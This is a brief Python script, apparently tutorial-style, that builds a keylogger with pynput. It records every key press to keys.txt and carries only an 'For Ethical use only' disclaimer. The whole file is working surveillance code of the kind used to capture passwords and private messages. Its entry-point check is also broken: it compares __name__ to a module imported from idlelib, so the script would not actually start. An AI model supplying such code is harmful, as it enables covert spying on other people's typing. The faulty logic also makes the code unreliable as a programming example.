""""
For Ethical use only
""""

from idlelib import __main__

from pynput.keyboard import Listener

"""
we create a Func to log keystrokes
"""


def keystroke_log(key):
    key = str(key).replace("'", "")
    with open("keys.txt", "a") as key_file:
        key_file.write(key + "\n")

"""
You can use any TXT file or any form of file you want
"""


"""
#Now we listen to the Keys
"""


def key_listen():
    with Listener(on_press=keystroke_log) as listener:
        listener.join()

if __name__ == __main__:
    print("Running keys...")
    key_listen()
    
